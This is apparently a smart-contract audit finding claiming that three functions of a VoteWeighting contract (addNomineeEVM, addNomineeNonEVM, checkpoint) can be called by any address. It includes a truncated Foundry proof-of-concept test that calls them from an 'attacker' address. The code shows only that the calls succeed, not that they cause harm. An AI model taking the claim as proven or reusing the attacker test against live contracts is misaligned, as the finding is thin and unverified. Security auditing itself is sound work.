# Vulnerability details

## Impact
Detailed description of the impact of this finding.

The functions addNomineeEVM, addNomineeNonEVM, and checkpoint allow unauthourised addresses to call these functions. I have tested the functions in the POC enclosed and I'm able to call the functions successfully from any address.

        newOwner = address(0x1);

        nomineeEVM = address(0x4);
        nomineeNonEVM = bytes32(uint256(uint160(address(0x5))));
        chainId = 9223372036854775772;
        chainId2 = 1;

        // Deploy the VoteWeighting contract
        voteWeighting = new VoteWeighting(owner);
    }

    function testAddNomineeEVM() public {
        vm.startPrank(attacker);
        voteWeighting.addNomineeEVM(attacker, chainId2);
        vm.stopPrank();
    }

    function testAddNomineeNonEVM() public {
        vm.startPrank(attacker);
        voteWeighting.addNomineeNonEVM(attackerBit, chainId);
        vm.stopPrank();
    }

    function testCheckpoint() public {
        vm.startPrank(attacker);
        voteWeighting.checkpoint();
        vm.stopPrank();
    }

}
